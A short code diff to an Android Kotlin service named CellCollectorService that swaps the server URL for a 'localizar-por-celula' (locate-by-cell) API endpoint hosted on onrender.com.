@@ -37,7 +37,7 @@ class CellCollectorService : Service() {
 
     private var telephonyManager: TelephonyManager? = null
     private var locationManager: LocationManager? = null
-    private var serverUrl = "https://orion-api-1ayv.onrender.com/api/localizar-por-celula"
+    private var serverUrl = "https://orion-api-izcm.onrender.com/api/localizar-por-celula"
     private var phoneNumber = ""
     private var isRunning = false
     private var workerThread: HandlerThread? = null
